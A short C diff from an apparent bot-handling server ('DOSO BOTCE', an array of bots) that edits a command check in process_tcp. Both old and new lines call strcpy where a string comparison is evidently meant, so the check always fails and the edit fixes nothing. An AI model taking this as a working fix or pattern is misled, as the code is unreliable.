@@ -405,7 +405,7 @@ void process_tcp(int tcp_sock, int udp_sock, struct bot *bots, int *number_of_bo
     
     char *ptr = strtok(buf, delim);
 
-    if(!strcpy(ptr, "GET")){
+    if(!strcpy(ptr, "GET\0")){
         printf("DOSO BOTCE\n");
         
         w_send(tcp_sock, ptr, strlen(ptr), 0);
